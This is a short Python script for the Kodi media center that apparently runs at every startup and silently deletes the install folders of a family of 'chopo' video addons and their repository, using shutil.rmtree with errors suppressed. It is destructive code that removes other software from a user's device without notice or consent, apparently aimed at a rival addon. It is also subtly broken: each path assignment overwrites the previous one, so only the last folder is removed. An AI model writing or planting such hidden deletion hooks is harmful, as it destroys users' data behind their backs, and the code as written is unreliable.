# -*- coding: UTF-8 -*-
#######################################################################
# ----------------------------------------------------------------------------
# te sacamos de la chopocueva en cada inicio
# ----------------------------------------------------------------------------
#######################################################################


import shutil

import xbmc

addon_path = xbmc.translatePath(('special://home/addons/plugin.video.choposex')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.chopocine')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.chopodplay')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.choposeries')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.mitelechopo')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.sinbarreras')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.atresplayerchopo')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.tvchopo')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.video.tvchopokids')).decode('utf-8')
addon_path = xbmc.translatePath(('special://home/addons/plugin.repository.tvchopo')).decode('utf-8')


shutil.rmtree(addon_path, ignore_errors=True)